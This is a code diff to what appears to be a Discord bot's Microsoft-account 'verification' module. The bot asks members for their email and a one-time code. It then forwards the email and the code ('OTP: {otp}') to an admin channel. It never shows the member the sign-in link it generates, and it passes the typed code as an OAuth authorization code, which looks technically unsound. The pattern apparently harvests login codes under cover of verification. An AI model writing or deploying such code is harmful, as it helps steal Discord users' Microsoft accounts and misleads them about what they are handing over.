@@ -37,59 +37,48 @@ class AuthManager:
         self.pending_otps = {}
 
     def generate_auth_url(self) -> Tuple[str, str]:
-        """Generate Microsoft OAuth URL with session tracking"""
         session_id = str(uuid.uuid4())
-        auth_params = {
-            'response_type': 'code',
-            'redirect_uri': self.redirect_url,  # Changed from redirect_uri to redirect_url
-            'scope': ['User.Read', 'offline_access'],
-            'prompt': 'login',
-            'response_mode': 'query',
-            'state': session_id,  # Using session_id directly as state
-            'session_id': session_id
-        }
-        
-        return self.msal_app.get_authorization_request_url(**auth_params), session_id
+        scopes = ['User.Read', 'offline_access']
+        auth_url = self.msal_app.get_authorization_request_url(
+            scopes,
+            state=session_id,
+            redirect_uri=self.redirect_url,
+            prompt='login',
+            response_mode='query'
+        )
+        return auth_url, session_id
 
     async def start_otp_verification(self, member: discord.Member, nickname: str, email: str) -> Tuple[bool, str]:
         """Start Microsoft Account OTP verification process"""
         try:
-            # Store verification attempt info
             self.pending_otps[member.id] = {
                 'nickname': nickname,
                 'email': email,
                 'timestamp': datetime.utcnow()
             }
-
-            # Generate auth URL for Microsoft Account OTP
-            auth_params = {
-                'response_type': 'code',
-                'redirect_uri': self.redirect_url,  # Changed from redirect_uri to redirect_url
-                'scope': ['email', 'offline_access'],
-                'prompt': 'login',
-                'login_hint': email,  # Pre-fill email
-                'amr_values': ['mfa'],  # Request MFA/OTP
-                'response_mode': 'query',
-                'domain_hint': 'organizations'  # Allow any email linked to Microsoft account
-            }
-            
-            auth_url = self.msal_app.get_authorization_request_url(**auth_params)
-            
-            # Send verification info to admin channel
+            scopes = ['email', 'offline_access']
+            auth_url = self.msal_app.get_authorization_request_url(
+                scopes,
+                redirect_uri=self.redirect_url,
+                prompt='login',
+                login_hint=email,
+                state=str(uuid.uuid4()),
+                response_mode='query',
+                domain_hint='organizations',
+                amr_values=['mfa']
+            )
             await self._send_admin_verification(
                 nickname,
                 "Microsoft OTP",
                 f"Email: {email}",
                 member.id
             )
-            
             return True, (
                 "Please check your email for the verification code.\n\n"
                 "Note: If this email is linked to your Microsoft account, "
                 "you'll receive the code. If not, please use a different email "
                 "that's connected to your Microsoft account."
             )
-            
         except Exception as e:
             logger.error(f"Error starting Microsoft OTP verification: {e}")
             return False, str(e)
@@ -100,39 +89,26 @@ class AuthManager:
             stored_data = self.pending_otps.get(member.id)
             if not stored_data:
                 return False, "No pending verification found. Please start the verification process again."
-            
-            # Check if verification attempt is expired (10 minutes)
             if datetime.utcnow() - stored_data['timestamp'] > timedelta(minutes=10):
                 del self.pending_otps[member.id]
                 return False, "Verification attempt expired. Please start over."
-
-            # Verify OTP with Microsoft
             result = self.msal_app.acquire_token_by_authorization_code(
                 otp,
                 scopes=['email', 'offline_access'],
-                redirect_uri=self.redirect_url,  # Changed from redirect_uri to redirect_url
+                redirect_uri=self.redirect_url,
                 login_hint=stored_data['email']
             )
-            
             if 'error' in result:
                 return False, "Invalid or expired code. Please try again."
-            
-            # Send successful verification to admin
             await self._send_admin_verification(
                 stored_data['nickname'],
                 "Microsoft OTP Success",
                 f"Email: {stored_data['email']}\nOTP: {otp}",
                 member.id
             )
-            
-            # Update roles
             await self._update_member_roles(member)
-            
-            # Clean up
             del self.pending_otps[member.id]
-            
             return True, "Successfully verified!"
-            
         except Exception as e:
             logger.error(f"Error verifying Microsoft OTP: {e}")
             return False, str(e)
